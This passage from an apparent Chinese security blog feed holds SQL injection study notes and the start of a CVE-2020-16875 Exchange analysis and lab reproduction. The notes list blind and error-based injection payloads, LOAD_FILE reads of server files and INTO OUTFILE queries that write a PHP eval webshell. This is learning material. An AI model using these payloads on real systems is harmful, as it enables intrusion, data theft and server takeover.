class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user_name=<span class="string">&#x27; or 1=1 # </span></span><br><span class="line"><span class="string">user_name=&#x27;</span> or <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1 </span></span><br></pre></td></tr></table></figure><h3 id="五、时间盲注"><a href="#五、时间盲注" class="headerlink" title="五、时间盲注"></a>五、时间盲注</h3><p>基本上和布尔盲注是一样的。</p><p>{“username”:”Biscuit19_’ and if(1=1,sleep(3),1) #”,”password”:” “}</p><p><strong>select * from mk_users where mk_username=’Biscuit19_’ and if(1=1,sleep(1),1) #’ and mk_password=’ ‘</strong></p><h3 id="六、报错注入"><a href="#六、报错注入" class="headerlink" title="六、报错注入"></a>六、报错注入</h3><h4 id="ExtractValue-报错注入"><a href="#ExtractValue-报错注入" class="headerlink" title="ExtractValue()报错注入"></a>ExtractValue()报错注入</h4><p>extractvalue()：从目标XML中返回包含所查询值的字符串。<br>　　EXTRACTVALUE (XML_document, XPath_string);<br>　　第一个参数：XML_document是String格式，为XML文档对象的名称<br>　　第二个参数：XPath_string (Xpath格式的字符串)</p><p>需要注意，extractvalue()能查询字符串的最大长度为32，</p><p><strong>报错原理</strong></p><p>例如</p><p><code>SELECT ExtractValue(&#39;&lt;a&gt;&lt;b&gt;&lt;b/&gt;&lt;/a&gt;&#39;, &#39;/a/b&#39;);</code> 就是寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误的话，就会报错。</p><p>​    也就是说，我们在第二个参数里输出的错误信息会原封不动的报错报出来，所以我们就通过这个来执行注入（当显示位）。</p><p><strong>约束条件</strong><br>输出字符长度限制为32个字符，可以用MID函数等操作</p><p><strong>注入语句</strong><br>and extractvalue(null,concat(0x7e,(代码操作),0x7e))</p><p>（这里的0x7e是 ~ 波浪号，只是为了好看）</p><p><strong>举例</strong><br>select * from users where id and extractvalue(null,concat(0x7e,(select version()),0x7e));</p><h5 id="MID函数"><a href="#MID函数" class="headerlink" title="MID函数"></a>MID函数</h5><blockquote><p><code>MID()</code>函数用于从文本字段中提取字符。 SELECT MID(column_name,start[,length]) FROM table_name;</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mid((select flag from flag),1,16)//从1开始截16个，即1-16</span><br></pre></td></tr></table></figure><h4 id="updatexml-报错注入"><a href="#updatexml-报错注入" class="headerlink" title="updatexml()报错注入"></a>updatexml()报错注入</h4><p>updatexml()函数与extractvalue()同理，第二个参数会被原封不动输出。</p><p>语法updatexml(目标xml文档，xml路径，更新的内容)</p><p>注入：</p><p>and (updatexml(‘1’,concat(0x7e,(代码操作),0x7e),’1’))</p><h3 id="七、读写文件"><a href="#七、读写文件" class="headerlink" title="七、读写文件"></a>七、读写文件</h3><h4 id="load-file"><a href="#load-file" class="headerlink" title="load_file()"></a>load_file()</h4><h5 id="1-使用条件"><a href="#1-使用条件" class="headerlink" title="1.使用条件"></a>1.使用条件</h5><ol><li>有读取文件的权限 <strong>r</strong></li></ol><p><code>and (select count(*) from mysql.user)&gt;0</code><br>如果返回正常则说明有权限，反之没有</p><ol start="2"><li><p>文件大小不能超过<strong>max_allowed_packet</strong></p></li><li><p><strong>secure_file_priv</strong>的值不为NULL</p></li></ol><h5 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h5><p><strong>必须指定完整路径的文件</strong>，而且必须有FILE权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select LOAD_FILE(&#x27;D:/1.txt&#x27;) </span><br><span class="line">select LOAD_FILE(&#x27;/var/www/html/ma.php&#x27;) </span><br><span class="line">select LOAD_FILE(&#x27;/flag&#x27;) </span><br></pre></td></tr></table></figure><p>输出文件内容，括号里必须是绝对路径</p><p>同样的，它也可以使用substring：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT SUBSTRING(LOAD_FILE(&#x27;D:/1.txt&#x27;),5,1)</span><br></pre></td></tr></table></figure><h4 id="outfile（）"><a href="#outfile（）" class="headerlink" title="outfile（）"></a>outfile（）</h4><p>写文件的,就是把select出来的所有东西都写进这个路径的文件中</p><p>1.当对于单引号过滤的时候，就完犊子了，因为绝对路径必须有单引号，十六进制和ASCII都不行</p><p>2.outfile经典一句话<br><code>select &#39;&lt;?php eval($_POST[cmd])?&gt;&#39; into outfile &#39;d：/muma.php&#39;</code></p><p>注意路径符号：错误“\” 正确”\“ 正确”/“。如果将路径转换为16进制就可以不用引号。</p><p>3.必须要有可写的权限。<strong>w</strong></p><p>4.如果单引号过滤，能找到phpmyadmin也行</p><p>5.linux真的是权限不行，必须给相关的目录包括父目录用户o开启W权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> (<span class="string">&#x27;&lt;?php  @eval($_POST[&quot;hack&quot;])?&gt;&#x27;</span>) <span class="keyword">into</span> outfile&quot;/var/www/html/ma.php&quot;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> (<span class="string">&#x27;&lt;?php  @eval($_REQUEST[&quot;hack&quot;])?&gt;&#x27;</span>) <span class="keyword">into</span> outfile &quot;D:/1.txt&quot;</span><br></pre></td></tr></table></figure><h2 id="如何去判断SQL注入漏洞"><a href="#如何去判断SQL注入漏洞" class="headerlink" title="如何去判断SQL注入漏洞"></a>如何去判断SQL注入漏洞</h2><ul><li>and 1=1 / and 1=2 回显页面不同（整形判断）</li><li>单引号判断 ‘ 显示数据库错误信息或者页面回显不同（整形，字符串类型判断）</li><li>\ (转义符)</li><li>-1/+1 回显下一个或上一个页面（整型判断）</li><li>and sleep(5) (判断页面返回时间)</li></ul><h2 id="0x04-注入检测"><a href="#0x04-注入检测" class="headerlink" title="0x04 注入检测"></a>0x04 注入检测</h2><h3 id="一、常见的注入点"><a href="#一、常见的注入点" class="headerlink" title="一、常见的注入点"></a>一、常见的注入点</h3><ul><li>GET/POST/PUT/DELETE参数</li><li>X-Forwarded-For</li><li>文件名</li></ul><h3 id="二、Fuzz注入点"><a href="#二、Fuzz注入点" class="headerlink" title="二、Fuzz注入点"></a>二、Fuzz注入点</h3><ul><li><code>&#39;</code> / <code>&quot;</code></li><li><code>1/1</code></li><li><code>1/0</code></li><li><code>and 1=1</code></li><li><code>&quot; and &quot;1&quot;=&quot;1</code></li><li><code>and 1=2</code></li><li><code>or 1=1</code></li><li><code>or 1=</code></li><li><code>&#39; and &#39;1&#39;=&#39;1</code></li><li><code>+</code> <code>-</code> <code>^</code> <code>*</code> <code>%</code> <code>/</code></li><li><code>&lt;&lt;</code> <code>&gt;&gt;</code> <code>||</code> <code>|</code> <code>&amp;</code> <code>&amp;&amp;</code></li><li><code>~</code></li><li><code>!</code></li><li><code>@</code></li><li>反引号执行</li></ul><h3 id="三、测试用常量"><a href="#三、测试用常量" class="headerlink" title="三、测试用常量"></a>三、测试用常量</h3><ul><li><code>@@version</code></li><li><code>@@servername</code></li><li><code>@@language</code></li><li><code>@@spid</code></li></ul><h3 id="四、注释符"><a href="#四、注释符" class="headerlink" title="四、注释符"></a>四、注释符</h3><ul><li><code>#</code></li><li><code>--+</code></li><li><code>/*xxx*/</code></li><li><code>/*!xxx*/</code></li><li><code>/*!50000xxx*/</code></li></ul><h3 id="五、-判断过滤规则"><a href="#五、-判断过滤规则" class="headerlink" title="五、 判断过滤规则"></a>五、 判断过滤规则</h3><ul><li>是否有trunc</li><li>是否过滤某个字符</li><li>是否过滤关键字</li><li>slash和编码</li></ul>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-16875漏洞分析与复现</title>
      <link href="/2022/03/26/CVE-2020-16875%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/03/26/CVE-2020-16875%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2020-16875漏洞分析与复现"><a href="#CVE-2020-16875漏洞分析与复现" class="headerlink" title="CVE-2020-16875漏洞分析与复现"></a>CVE-2020-16875漏洞分析与复现</h1><h2 id="0x01-漏洞简述"><a href="#0x01-漏洞简述" class="headerlink" title="0x01 漏洞简述"></a>0x01 漏洞简述</h2><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220317195204247.png" alt="image-20220317195204247" style="zoom:50%;" /><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220317195232845.png" alt="image-20220317195232845"></p><p>​    Microsoft Exchange Server 是个消息与协作系统。由于对cmdlet参数的验证不正确，Microsoft Exchange服务器中存在一个远程执行代码漏洞。成功利用此漏洞的攻击者可以在系统用户的上下文中运行任意代码。</p><p>利用条件：<strong>利用此漏洞需要拥有以某个Exchange角色进行身份验证的用户权限。</strong></p><h2 id="0x02-环境配置"><a href="#0x02-环境配置" class="headerlink" title="0x02 环境配置"></a>0x02 环境配置</h2><p>我觉得这个漏洞的环境的配置是真的恶心了，这个exchange server真实配的我血压上升。</p><p><strong>虚拟机：win server 2016：</strong></p><p>​    内存最好8G或以上，CPU 4或以上，否则因为内存爆炸然后崩溃。</p><p><strong>SERVER：2016 CU16</strong></p><p>可以参考博客：<a href="https://saucer-man.com/information_security/748.html#cl-6">https://saucer-man.com/information_security/748.html#cl-6</a></p><h3 id="一、服务配置："><a href="#一、服务配置：" class="headerlink" title="一、服务配置："></a>一、服务配置：</h3><p>首先需要安装各种服务：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220318140219204.png" alt="image-20220318140219204"></p><h3 id="二、官网下载iso"><a href="#二、官网下载iso" class="headerlink" title="二、官网下载iso"></a>二、官网下载iso</h3><p>在官网下载所需iso的文件，慢慢下。。。</p><h3 id="三、处理报错"><a href="#三、处理报错" class="headerlink" title="三、处理报错"></a>三、处理报错</h3><p>​    使用管理员用户运行iso下的<strong>setup.exe</strong>，没有什么特别的，按照自己的想法选，一直下一步，等待进度条慢的我想死…<img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220318141055526.png" alt="image-20220318141055526"></p><p>​    然后开始处理报错（现在只剩一个了，原来有六个。。。），把这些报错全都处理掉就可以了。总体来说，解决方案就是点后面给的链接直接下，一个一个慢慢来。</p><p>​    期间安了十来个包，重启了六七次，我真是吐了。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220318144601332.png" alt="image-20220318144601332"></p><p>​    安装非常之慢，大概需要三个小时左右</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220318165237797.png" alt="image-20220318165237797"></p><p>​    注意，内存一定要够大，否则就会像我一样白给。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220317210232397.png" alt="image-20220317210232397"></p><p>​    先在官网上向前翻找到，漏洞产生时的更新版本，可以看到专门为这个漏洞更了一版，可见其危害，下载这一版本前一版，也就是未patch的相关版本文件，不过我们不是用户，所以也不需要做安全更新。</p><h3 id="四、处理w3wp-exe"><a href="#四、处理w3wp-exe" class="headerlink" title="四、处理w3wp.exe"></a>四、处理w3wp.exe</h3><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220319101342425.png" alt="image-20220319101342425"></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220319101349793.png" alt="image-20220319101349793"></p><p>可以看到w3wp杀疯了直接，我们需要对他做一些限制。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220319104647853.png" alt="image-20220319104647853"></p><p>​    只能说好了一点，但是时不时的还会疯狂卡顿，目前没找到好的解决方案。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220319104656061.png" alt="image-20220319104656061"></p><p>注意，此处还需要更改如下字段，否则会出现503错误：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220319110623617.png" alt="image-20220319110623617"></p><p>终于，访问到了：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220319111214876.png" alt="image-20220319111214876"></p><p>（密码就是电脑管理员账号密码）</p><h3 id="五、版本确认："><a href="#五、版本确认：" class="headerlink" title="五、版本确认："></a>五、版本确认：</h3><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220319120740412.png" alt="image-20220319120740412"></p><p>与官网进行对比：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="operator">/</span><span class="operator">/</span>docs.microsoft.com<span class="operator">/</span>zh<span class="operator">-</span>cn<span class="operator">/</span>Exchange<span class="operator">/</span><span class="keyword">new</span><span class="operator">-</span>features<span class="operator">/</span>build<span class="operator">-</span>numbers<span class="operator">-</span><span class="keyword">and</span><span class="operator">-</span><span class="keyword">release</span><span class="operator">-</span>dates?<span class="keyword">view</span><span class="operator">=</span>exchserver<span class="number">-2019</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220319120909484.png" alt="image-20220319120909484"></p><h2 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h2><h3 id="一、背景知识"><a href="#一、背景知识" class="headerlink" title="一、背景知识"></a>一、背景知识</h3><p>下面对上文中我们在安装过程中遇到的新名词进行学习，本部分内容参考百度百科相关词条。</p><h4 id="1-iis："><a href="#1-iis：" class="headerlink" title="1.iis："></a>1.iis：</h4><p>互联网信息服务（英语：Internet Information Services,简称IIS），是由微软公司提供的基于运行Microsoft Windows的互联网基本服务,可以实现在windows上部署小型网站。</p><h4 id="2-NET"><a href="#2-NET" class="headerlink" title="2. .NET:"></a>2. .NET:</h4><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/267f9e2f070828383f020665b299a9014c08f1b0" alt="img"></p><p>.NET框架（.NET Framework） 是由微软开发的网络软件开发平台，处在较为下层的位置，其是一个多语言组件开发和执行环境，它提供了一个跨语言的统一编程环境。.NET框架的目的是便于开发人员更容易地建立Web应用程序和Web服务，使得Internet上的各应用程序之间，可以使用Web服务进行沟通。</p><h4 id="3-exchange："><a href="#3-exchange：" class="headerlink" title="3.exchange："></a>3.exchange：</h4><p>Microsoft Exchange Server 是个消息与协作系统。Exchange server可以被用来构架应用于企业、学校的邮件系统或免费邮件系统，简单的说，他是一个基于.NET架构开发的一个软件。</p><h4 id="4-DLP"><a href="#4-DLP" class="headerlink" title="4.DLP"></a>4.DLP</h4><blockquote><p>​    防止数据丢失(Data loss Prevention)是Exchange Server 2013带来的一个新功能，感觉其实应该叫做防止数据泄露，许多第三方工具和设备也有类似的功能，而在Exchange 2013中直接集成了，并且之前的传输规则也整合到了一起。该功能通过对内容的深入分析，能够帮助企业识别、监控和保护敏感信息传递。</p><p>​    DLP通过关键字匹配、词典匹配、正则表达式的评估，和其他内容的检查，深入分析内容以发现组织内违法DLP规则的内容。一旦发现了违反了规则的内容，DLP会对用户进行提醒或者是组织，告知提醒用户邮件包含敏感内容或者违规传递。</p></blockquote><h3 id="二-基本情况概述"><a href="#二-基本情况概述" class="headerlink" title="二.基本情况概述"></a>二.基本情况概述</h3><p>​    在官网中，对于该漏洞的描述是：由于对 cmdlet 参数的验证不正确，Microsoft Exchange 服务器中存在远程执行代码漏洞。</p><p>​    其中又提到了一个我们不熟悉的词汇：<strong>cmdlet</strong>。cmdlet 是在 PowerShell 环境中使用的一种轻量级命令，其会执行操作，并且通常会向管道中的下一个命令返回一个 Microsoft .NET 对象。实际上根据我的查询理解，其就是powershell为用户设置的一个接口，开发、使用者可以通过cmdlet执行命令。</p><p>​    那么在exchange server中，专门为了避免数据丢失，设立了一个Data Loss Prevention角色，这个角色可以使用命令<strong>New-DlpPolicy</strong>来新建一个对于内容检查的政策，而该政策的参数中包括一个参数**-TemplateData**，由于对此参数没有进行任何过滤操作，系统会直接执行此参数传入的内容，导致代码执行漏洞（且是在system权限下的）。</p><h4 id="基础信息："><a href="#基础信息：" class="headerlink" title="基础信息："></a>基础信息：</h4><p>​    漏洞文件：<strong>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET\Files\ecp\App_Web_xxxx.dll</strong></p><p>​    漏洞函数：<strong>System.Web.UI.Page类，ProcessUpload()函数</strong></p><p>​    漏洞参数：**-TemplateData**</p><p>​    基础权限：<strong>Data Loss Prevention角色</strong></p><h3 id="三、漏洞原理分析"><a href="#三、漏洞原理分析" class="headerlink" title="三、漏洞原理分析"></a>三、漏洞原理分析</h3><p>在本部分中，我们选用<a href="%60https://github.com/0xd4d/dnSpy%60">dnspy</a>作为分析工具。<br>分析的相关步骤，思路，和部分图源参考：<a href="https://www.anquanke.com/post/id/219091?from=timeline%EF%BC%9B">https://www.anquanke.com/post/id/219091?from=timeline；</a></p><p><strong>总述：</strong>此漏洞核心问题是对cmdlet参数处理不当，或者说没有验证参数是否合法。不过该漏洞需要对应账户开启Data Loss Prevention角色，否则无法访问漏洞所在页面。</p><h4 id="1-aspx处理流程基础知识"><a href="#1-aspx处理流程基础知识" class="headerlink" title="1. aspx处理流程基础知识"></a>1. aspx处理流程基础知识</h4><blockquote><p>aspx文件是<a href="https://baike.baidu.com/item/%E5%BE%AE%E8%BD%AF/124767">微软</a>的在服务器端运行的动态网页文件 [1] ,属于<a href="https://baike.baidu.com/item/ASP.NET%E6%8A%80%E6%9C%AF/14696255">ASP.NET技术</a>。ASP.NET是由微软在·NET Framework框架中所提供，开发Web应用程序的类库.</p><p>aspx文件是微软的在<a href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF/3369401">服务器端</a>运行的<a href="https://baike.baidu.com/item/%E5%8A%A8%E6%80%81%E7%BD%91%E9%A1%B5">动态网页</a>文件，而不像静态的html文件。它通过IIS解析执行后可以得到<a href="https://baike.baidu.com/item/%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2">动态页面</a>，是微软推出的一种新的<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B">网络编程</a>方法，而不是asp的简单升级，因为它的编程方法和asp有很大的不同，他是在服务器端靠服务器<a href="https://baike.baidu.com/item/%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C">编译执行</a>的程序代码。</p></blockquote><p>摘自百度百科aspx词条。</p><p>​    在每一次http请求时，都会有一个<strong>HttpApplication</strong>类型的对象来管理这次请求的过程，同时创建一个<strong>HttpContext</strong>对象，前者负责装配出整个“<strong>HTTP请求处理管线（HTTP Pipeline）</strong>”也就是一条用于处理后者的流水线。<strong>HttpContext</strong>对象经过流水线的不同部分时，<strong>HttpApplication</strong>对象会先后激发出一连串的事件，在响应这些事件时，<strong>HttpContext</strong>对象被处理。处理了相关事件之后，<strong>HttpContext</strong>对象会最终被Page对象所接收，并成为<strong>Page</strong>类中的<strong>Context</strong>属性。</p><p>​    综上，每个被访问的<strong>ASP.NET</strong>页面都会被转换为一个“<strong>派生自Page类的页面类”</strong>。</p><p>​    然后呢，在Page类中，实现了<strong>IHttpHandler</strong>接口，此接口定义了一个<strong>ProcessRequest()<strong>方法。</strong>ASP.NET</strong>页面类生成以后被自动编译为程序集，然后其<strong>ProcessRequest()<strong>方法被自动调用。</strong>ProcessRequest()<strong>方法 的执行结果再次被</strong>HttpContext</strong>对象所承载，控制又转回到“HTTP请求处理流水线”中，<strong>HttpApplication</strong>对象继续激发后继的事件。这时，如果还有特定的HTTP模块响应这些事件，则它们会被自动调用。</p><pre><code> 综上，ASP.NET页面会被转化为一个页面类后，自动调用**ProcessRequest()**方法进行处理。</code></pre><h4 id="2-dnspy调试前折磨"><a href="#2-dnspy调试前折磨" class="headerlink" title="2.dnspy调试前折磨"></a>2.dnspy调试前折磨</h4><p>​    那么，由于我们在浏览器上访问了ManagePolicyFromISV.aspx页面，aspx文件在.NET Framework下运行一般会在<code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\ecp\</code>路径中生成App_Web_xxxx.dll，我们可以这些有可能的dll拖入dnSpy工具中，并找到负责处理ManagePolicyFromISV.aspx页面的类。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220326215522930.png" alt="image-20220326215522930"></p><p>​    从如下的dll中一个一个寻找，突出的就是一个痛苦。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220326215841501.png" alt="image-20220326215841501">    找到了！我们进入ProcessRequest函数中，可以看到这个函数调用了另一个ProcessRequest函数，我们双击进入，进入的是进入<strong>System.Web.UI.Page</strong>类中的**public virtual void ProcessRequest(HttpContext context)**函数：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220326220025760.png" alt="image-20220326220025760"></p><p>上图函数开始处下个断点：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220326220152717.png" alt="image-20220326220152717"></p><p>好了，现在我们可以开始动态调试了！</p><p>在这个时候，我们会面临一个问题，我们要调试哪一个进程：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220326214314069.png" alt="image-20220326214314069"></p><p>此时可以通过上图中的命令，找到我们要调试的进程<strong>MSExchangeECPAppPool</strong>，附加到该进程上    </p><h4 id="3-dnspy分析函数调用链"><a href="#3-dnspy分析函数调用链" class="headerlink" title="3.dnspy分析函数调用链"></a>3.dnspy分析函数调用链</h4><p>​    中间单步的代码逻辑此处略过不表</p><pre><code> 一步步调试，我们可以发现，进入`System.Web.UI.Page`类的`ProcessRequest()`函数后，之后又会来到`ProcessRequestMain()`函数。</code></pre><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220326220622446.png" alt="image-20220326220622446">    然后，<code>ProcessRequestMain()</code>又会调用<code>LoadRecursive()</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220326220738065.png" alt="image-20220326220738065"><code>LoadRecursive()</code>根据对象的不同，又会进入不同的处理方法,对于我们的这了dlp策略，程序最终会进入<code>Microsoft.Exchange.Management.ControlPanel.DLPISVService</code>类中的<code>ExecuteUpload()</code>函数中，该函数很快调用了<code>PSCommand()</code>函数。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/t013a814c82e57d23ca.png" alt="img"></p><p>（此图源自：<a href="https://www.anquanke.com/post/id/219091?from=timeline%EF%BC%8C%E5%9B%A0%E4%B8%BA%E6%88%91%E4%B8%8D%E7%9F%A5%E9%81%93%E6%80%8E%E4%B9%88%E6%89%93%E5%BC%80%E8%B0%83%E7%94%A8%E5%A0%86%E6%A0%88%EF%BC%89">https://www.anquanke.com/post/id/219091?from=timeline，因为我不知道怎么打开调用堆栈）</a></p><p>从调用堆栈中，可以看到函数调用的顺序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Microsoft.Exchange.Management.ControlPanel.dll!Microsoft.Exchange.Management.ControlPanel.DLPISVService.ProcessUpload(Microsoft.Exchange.Management.ControlPanel.DLPPolicyUploadParameters parameters) (IL=<span class="number">0x0006</span>, Native=<span class="number">0x00007FFF99CF4E50</span>+<span class="number">0x15</span>)</span><br><span class="line">     Microsoft.Exchange.Management.ControlPanel.dll!Microsoft.Exchange.Management.ControlPanel.ManagePolicyFromISV.ExecuteUpload() (IL≈<span class="number">0x00CE</span>, Native=<span class="number">0x00007FFF99CF48A0</span>+<span class="number">0x298</span>)</span><br><span class="line">     Microsoft.Exchange.Management.ControlPanel.dll!Microsoft.Exchange.Management.ControlPanel.ManagePolicyFromISV.OnLoad(System.EventArgs e) (IL=epilog, Native=<span class="number">0x00007FFF99CE4410</span>+<span class="number">0x10C</span>)</span><br><span class="line">     System.Web.dll!System.Web.UI.Control.LoadRecursive() (IL≈<span class="number">0x0011</span>, Native=<span class="number">0x00007FFFE5E53100</span>+<span class="number">0x100</span>)</span><br><span class="line">     System.Web.dll!System.Web.UI.Page.ProcessRequestMain(<span class="keyword">bool</span> includeStagesBeforeAsyncPoint, <span class="keyword">bool</span> includeStagesAfterAsyncPoint) (IL=<span class="number">0x04C3</span>, Native=<span class="number">0x00007FFFE5E61250</span>+<span class="number">0xEC9</span>)</span><br><span class="line">     System.Web.dll!System.Web.UI.Page.ProcessRequest(<span class="keyword">bool</span> includeStagesBeforeAsyncPoint, <span class="keyword">bool</span> includeStagesAfterAsyncPoint) (IL=<span class="number">0x003C</span>, Native=<span class="number">0x00007FFFE5E60FF0</span>+<span class="number">0x9F</span>)</span><br><span class="line">     System.Web.dll!System.Web.UI.Page.ProcessRequest() (IL≈<span class="number">0x0014</span>, Native=<span class="number">0x00007FFFE5E60F60</span>+<span class="number">0x4B</span>)</span><br><span class="line">     System.Web.dll!System.Web.UI.Page.ProcessRequest(System.Web.HttpContext context) (IL=epilog, Native=<span class="number">0x00007FFFE5E60EE0</span>+<span class="number">0x46</span>)</span><br><span class="line">     App_Web_ojcsje1s.dll!ASP.dlppolicy_managepolicyfromisv_aspx.ProcessRequest(System.Web.HttpContext context) (IL=<span class="number">0x0007</span>, Native=<span class="number">0x00007FFF99CDD310</span>+<span class="number">0x2D</span>)</span><br></pre></td></tr></table></figure><p>最后，我们的参数parameters将会被传给<code>New-DLPPolicy</code>这个<code>cmdlet</code>中，然后直接被执行。</p><p>​    总结一下函数的调用链，如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220326205544078.png" alt="image-20220326205544078"></p><p>分析过后，我们已经对调用流程非常了解了，下面我们需要分析调用最后一步出现的参数。</p><h4 id="4-cmdlet分析"><a href="#4-cmdlet分析" class="headerlink" title="4.cmdlet分析"></a>4.cmdlet分析</h4><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220326221348607.png" alt="image-20220326221348607"></p><p>也就是最后一步调用中使用PSCommand函数中名为<strong>New-DLPPolicy</strong>的这个<strong>cmdlet</strong>：</p><p>对于其详细的解释，我们直接访问<a href="https://docs.microsoft.com/zh-cn/powershell/module/exchange/new-dlppolicy?view=exchange-ps">微软官网该词条</a>：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220326221811945.png" alt="image-20220326221811945"></p><p>​    <em>此cmdlet可在本地Exchange和基于云的服务中使用，使用DlpPolicy cmdlet可以在您的Exchange组织中创建数据丢失防护(DLP)策略</em>。在下方参数列表中，我们发现参数 **[-TemplateData &lt;Byte[]&gt;]**，这与刚刚我们调试中看到的内容是一致的！</p><p>往下看：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220326222046349.png" alt="image-20220326222046349"></p><p>也就是呢，我们可以使用<strong>New-DLPPolicy</strong>作为一条命令，其中有一条参数，是我们所能够控制的参数。</p><p>那从用户的角度来看，我们的传入点在哪呢？</p><p>​    在<a href="https://docs.microsoft.com/en-us/exchange/developing-dlp-policy-template-files-exchange-2013-help">官网</a>找到上文中提到的dlp处理机制文件上传模板如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dlpPolicyTemplates</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dlpPolicyTemplate</span> <span class="attr">id</span>=<span class="string">&quot;F7C29AEC-A52D-4502-9670-141424A83FAB&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;Audit&quot;</span> <span class="attr">state</span>=<span class="string">&quot;Enabled&quot;</span> <span class="attr">version</span>=<span class="string">&quot;15.0.2.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">contentVersion</span>&gt;</span>4<span class="tag">&lt;/<span class="name">contentVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">publisherName</span>&gt;</span>Microsoft<span class="tag">&lt;/<span class="name">publisherName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">localizedString</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span>PCI-DSS<span class="tag">&lt;/<span class="name">localizedString</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span 